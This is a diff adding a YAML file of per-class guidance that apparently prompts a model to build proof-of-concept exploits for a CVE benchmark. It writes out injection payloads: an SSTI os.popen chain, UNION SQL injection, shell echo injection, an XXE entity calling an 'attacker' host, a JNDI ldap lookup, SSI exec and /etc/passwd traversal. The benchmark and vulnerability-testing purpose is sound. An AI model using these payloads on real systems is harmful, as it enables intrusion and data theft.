@@ -1,0 +1,126 @@
+# Per-class CRAFT-AND-PROVE guidance for PoC synthesis.
+#
+# Moved out of app/rag-api/api.py (_CRAFT_CLASS_GUIDANCE) on 2026-10-17. It was
+# the largest class-keyed table still in Python, so changing how a class is
+# crafted or proven cost an image rebuild and a deploy. knowledge/ is
+# bind-mounted into rag-api, so an edit here takes effect on the next process
+# start with no rebuild.
+#
+# Read two ways, as CLAUDE.md requires of action-defining knowledge:
+#   * deterministically, by etl/craft_guidance.py -> _CRAFT_CLASS_GUIDANCE
+#   * by similarity, embedded into rag_documents by etl/load_knowledge_documents.py
+#
+# Keys are CANONICAL class names from knowledge/vuln_classes.yaml. Text is
+# prompt prose handed to the model verbatim — regexes inside it are written for
+# the MODEL to copy, so their backslashes are deliberate.
+version: 1
+guidance:
+  ssrf: 'The target reads a URL parameter and fetches it server-side. Place the canary IN THE URL the server fetches, e.g. http://localhost:8000/<canary>. The CVE-Bench sink at :9091/done will report attack_success when the server made the outbound request. If an OOB sink URL is in the spec, your assertion should match on `SINK-VERIFIED: <canary>` after the attacker polls the sink.'
+  sqli: 'FIRST try union-based / error-based injection that makes the canary VISIBLE in the response: inject <canary> into a reflected column (e.g. '' UNION SELECT 1,''<canary>'',3-- ) and return assertion {"expect_regex": "<canary>"}. Substitute the real canary string into the payload — never leave a {CANARY} placeholder — and never place it only inside a SQL comment (after --), where it cannot be reflected. ONLY fall back to a time-based blind payload (SLEEP(5) / pg_sleep(5) / WAITFOR DELAY ''0:0:5'', assertion {"min_seconds": 5, "canary": "<canary>"}) when the injection genuinely returns no reflected output, or the advisory explicitly says the vulnerability is time-based / blind. A timing verdict proves only that the server was slow; a reflected canary proves it executed your payload.'
+  ssti: 'Jinja2/Twig/ERB template injection. Place the canary as a template variable the server evaluates, e.g. {{<canary expression>}} that resolves to the canary string in the response. Common SSTI payloads: {{config.__class__.__init__.__globals__[''os''].popen(''echo <canary>'').read()}}'
+  cmdi: Shell command injection. Append a `; echo <canary>`, `` `echo <canary>` `` or `|echo <canary>` to the vulnerable parameter so the server echoes the canary in its response.
+  lfi: |-
+    Local file inclusion — a file read reached through a PARAMETER (`?page=../../etc/passwd`, `?file=`, `?template=`).
+    Find the parameter first: it is required for this class and the gather gate demands it.
+    A FILE READ INJECTS NOTHING, so a canary is the WRONG proof: an expect_regex on a canary can never match, and a canary that DOES come back means the app ECHOED your input rather than disclosing a file.
+    Prove it with CONTENT ONLY THE REAL FILE HAS:
+      /etc/passwd       -> expect_regex "root:x:0:0:"
+      /etc/hosts        -> expect_regex "127\\.0\\.0\\.1"
+      WEB-INF/web.xml   -> expect_regex "<web-app"
+      web.config        -> expect_regex "<configuration"
+      /proc/self/environ-> expect_regex "PATH="
+      win.ini           -> expect_regex "\\[fonts\\]"
+    Request the LEAST sensitive file that proves the primitive first (/etc/hosts or web.xml), never credentials or keys, and stop once the flaw is demonstrated.
+    Assertion shape: {"expect_regex": "<a marker from the file>"}. Do NOT put a canary in the filename and do NOT assert on one.
+  upload: Upload a file whose content contains the canary and whose extension bypasses the whitelist (e.g. .phtml / .phar / double extension). Then fetch the uploaded file's URL and expect the canary in the response.
+  auth-bypass: Login as the ATTACKER role (DEFAULT_USERNAME/DEFAULT_PASSWORD from the challenge), then exploit the IDOR / privilege escalation to access the admin-only resource. The canary should land in the admin resource's response, OR be set via admin API.
+  privilege-escalation: "Obtain the elevated ROLE, then PROVE it by USING it. (1) Create or update an account with the elevated role in the same request (e.g. a registration or profile endpoint that accepts role=administrator / capabilities / user_level). Make every identity value UNIQUE per attempt and build it from the canary: username <canary>_$RANDOM, email <canary>_$RANDOM@example.com -- a re-used email answers \"already in use\" and nothing after it can succeed. (2) Log in as that new account. (3) Request a page or API only that role can reach (an admin user list, settings page, or admin API) and assert the canary appears THERE. The registration reply echoing the username you sent is NOT proof -- it shows the form accepted input, not that the role was granted."
+  xxe: 'Submit XML containing an external entity that references the canary at the OOB sink. Example: <!DOCTYPE foo [<!ENTITY xxe SYSTEM ''http://attacker/<canary>''>]><foo>&xxe;</foo>'
+  deserialization: Craft a serialized object (pickle / unserialize / yaml.load) that executes `echo <canary>` on deserialization and reflects the output in the response.
+  xss: Not usually canary-reflectable from a server-side perspective. Try a reflected XSS payload where <script>document.title='<canary>'</script> appears in the response HTML body — assertion matches on the canary string literal.
+  unknown: The CVE's vuln class is unclassified. Use the advisory_poc from the spec as a starting shape; adapt the canary placement to land in the response.
+  path-traversal: |-
+    Path traversal — the payload IS the URL PATH (`/download/resources/../../../WEB-INF/web.xml`). There is NO parameter: do not look for one, and do not run parameter discovery.
+    Craft the traversal into the advisory's download / resource route, and try the encoded forms the server may normalise differently: `../`, `..%2f`, `%2e%2e%2f`, `....//`.
+    A FILE READ INJECTS NOTHING, so a canary is the WRONG proof: a canary that comes back means the app ECHOED your input rather than disclosing a file.
+    Prove it with CONTENT ONLY THE REAL FILE HAS:
+      /etc/passwd       -> expect_regex "root:x:0:0:"
+      /etc/hosts        -> expect_regex "127\\.0\\.0\\.1"
+      WEB-INF/web.xml   -> expect_regex "<web-app"
+      web.config        -> expect_regex "<configuration"
+      /proc/self/environ-> expect_regex "PATH="
+      win.ini           -> expect_regex "\\[fonts\\]"
+    Request the LEAST sensitive file that proves the primitive first (/etc/hosts or web.xml), never credentials or keys, and stop once the flaw is demonstrated.
+    Assertion shape: {"expect_regex": "<a marker from the file>"}. Do NOT put a canary in the filename and do NOT assert on one.
+  rfi: |-
+    Remote file inclusion — a PARAMETER makes the server FETCH a URL you control (`?page=http://<sink>/x`). It is SSRF-shaped: the proof is the request arriving at your sink, not content in the response, so an out-of-band sink is required.
+    Find the parameter first. Point it at the configured sink and assert on the sink poll, not on the page body.
+    If the sink is unreachable the class cannot be proven here — say so rather than asserting on an echo.
+  idor: |-
+    Insecure direct object reference — change an IDENTIFIER in a parameter or path segment (`?id=`, `/api/orders/1041`) and see ANOTHER tenant's record come back.
+    The proof is CONTENT BELONGING TO SOMEONE ELSE, not a 200: the endpoint returns 200 for your own id too. Request your own object first, then the neighbouring id, and assert on a field whose value differs (a name, an email, an account number).
+    A canary is the WRONG proof — you inject nothing, you read what is already there.
+    Hold the session while doing it: an unauthenticated 200 is a missing-auth finding, which is a different class.
+  csrf: |-
+    Cross-site request forgery — a state-changing request is accepted WITHOUT its anti-forgery token.
+    Prove it by replaying the real request with the CSRF token removed (and then with a wrong one) while keeping the session cookie, and showing the state change still happened.
+    The proof is the SIDE EFFECT, so assert on a follow-up read that shows the new state — a 200 on the POST alone proves nothing, because many apps return 200 and ignore the body.
+  open-redirect: |-
+    Open redirect — a parameter controls the Location header (`?next=`, `?url=`, `?returnTo=`).
+    Prove it with the REDIRECT TARGET, not the status: assert the response is 30x AND that Location points at a host you supplied. Follow-redirects must be OFF or the proof is consumed by curl.
+    A same-host redirect is not the finding; the target must be off-site.
+  nosql-injection: |-
+    NoSQL injection — operator injection into a document query, usually through a JSON body (`{"user": {"$ne": null}}`) or a bracketed query parameter (`user[$ne]=`).
+    Content-Type matters: the operator form only reaches the driver when the body is parsed as JSON.
+    Prove it with a RESULT SET THAT CHANGES — an always-true operator returning a record that the honest value does not. Blind variants use `$where` with a sleep; a timing verdict needs the scaled-payload confirmation like any other.
+  ldap-injection: |-
+    LDAP injection — directory filter metacharacters in a parameter (`*`, `)(`, `|`).
+    Prove it with a FILTER THAT MATCHES MORE than the honest value: `*` in a username field returning a directory entry, or `*)(uid=*` returning several.
+    A 500 is a syntax error, not a proof — it shows the input reaches the filter, so keep going rather than asserting on it.
+  prototype-pollution: |-
+    Prototype pollution — `__proto__`, `constructor.prototype` or a nested key in a JSON body reaches a recursive merge.
+    Prove it with an OBSERVABLE CONSEQUENCE, not the write: pollute a key the app reads later (a flag, a status, a template field) and show the next response carries it. The polluting request usually returns a perfectly normal 200.
+    Send a second, unrelated request to observe the effect — polluting and asserting in one request proves nothing.
+  el-injection: |-
+    Expression Language / OGNL injection — a parameter reaches an expression evaluator (Struts OGNL, Spring SpEL, JSP EL).
+    Payload syntax is NOT template syntax: `%{...}` and `${...}`, not `{{...}}`. Start with arithmetic that could not appear by accident (`%{13337-7}` -> 13330) and read it back from the response.
+    Escalate only after the arithmetic proves evaluation. A reflected `%{13337-7}` string that comes back UNCHANGED means the expression was not evaluated — that is a negative, not a near miss.
+  jndi-injection: |-
+    JNDI injection (Log4Shell family) — a logged or evaluated string triggers an outbound JNDI lookup.
+    The proof is OUT-OF-BAND and nothing else: `${jndi:ldap://<sink>/x}` placed in a header the app logs (User-Agent, X-Api-Version, Authorization) or in a parameter. The response is normally a plain 200 and tells you nothing.
+    Assert on the SINK receiving the lookup. With no reachable sink this class cannot be proven here — say so rather than asserting on the response body.
+    Make the hostname unique per attempt so a stale callback cannot be read as this one.
+  crlf-injection: |-
+    CRLF injection / response splitting — an encoded `%0d%0a` in a parameter that reaches a response header (usually Location or Set-Cookie).
+    Prove it with an INJECTED HEADER you chose, read from the response headers: `%0d%0aX-Injected:+canary`. Use `curl -i` (or `-D -`) or the header never appears in the output at all.
+    Do NOT follow redirects — the proof lives in the 30x response being replaced, and curl will consume it.
+  host-header-injection: |-
+    Host header injection — the app trusts the Host (or X-Forwarded-Host) header to build absolute URLs.
+    Prove it with YOUR host coming back in a link or a redirect: send `Host: <sink>` and assert the sink appears in the Location header or in an absolute URL in the body.
+    The high-impact form is a password-reset link pointing at your host; that proof is a SIDE EFFECT arriving out-of-band, not a response body.
+    A 400 from the server means the vhost is enforced — a clean negative.
+  ssi-injection: |-
+    Server-side includes injection — SSI directives in a parameter that lands in a page the server parses (.shtml and friends).
+    Prove it with a directive whose OUTPUT could not be echoed: `<!--#exec cmd="id"-->` returning uid=, or `<!--#echo var="DOCUMENT_ROOT"-->` returning a path.
+    If the directive comes back VERBATIM it was not parsed — the page is probably not SSI-enabled. That is a negative, not an encoding problem.
+  xpath-injection: |-
+    XPath injection — metacharacters in a parameter that reaches an XPath query (`'`, `or`, `*`, `and`).
+    Prove it with a NODE SET THAT CHANGES: `' or '1'='1` returning a record the honest value does not, or returning several where one was expected.
+    Blind variants key on a boolean difference between two requests — assert on the difference, not on a single response.
+    A 500 is a syntax error: it shows the input reaches the query, so keep going rather than asserting on it.
+  smtp-injection: |-
+    SMTP / IMAP header injection — CRLF in a mail-related parameter (recipient, subject, name) injects extra headers or commands.
+    The proof is a SIDE EFFECT you observe out-of-band: an injected `Bcc:` to an address you control, arriving at your sink. The HTTP response is normally a plain success page.
+    With no mail sink reachable this cannot be proven here — say so rather than asserting on the confirmation page.
+  format-string: |-
+    Format string injection — a parameter reaches a formatting function with the user value used AS the format.
+    Prove it with a conversion that CANNOT appear by accident: `%x%x%x` returning hex, or `%s` returning something other than the literal `%s`.
+    The literal string coming back unchanged is a clean negative: the value was an argument, not the format.
+  hpp: |-
+    HTTP parameter pollution — the same parameter sent twice, where the server and a downstream component disagree about which wins.
+    Prove it with a DIFFERENCE BETWEEN THREE requests: the honest value, the attack value, and both together. The finding is that `a=safe&a=evil` behaves like `a=evil` (or bypasses a filter that saw only `a=safe`).
+    A single polluted request that merely returns 200 proves nothing — the comparison IS the proof.
+  rce: |-
+    Remote code execution — a CONSEQUENCE, not a mechanism. If the advisory names how it is reached (command injection, template injection, deserialization, expression language, file upload), craft for THAT class instead: its guidance says where the payload goes and what proves it.
+    When the mechanism is genuinely unknown, prove EXECUTION rather than reachability: a command whose output could not be echoed back (`id` -> uid=, `hostname`, `uname -a`), or an outbound callback to the sink carrying the host's own name.
+    A reflected canary is the WRONG proof here — it shows the input came back, not that anything ran. A 500 shows the payload reached something that broke, which is a lead, not a verdict.
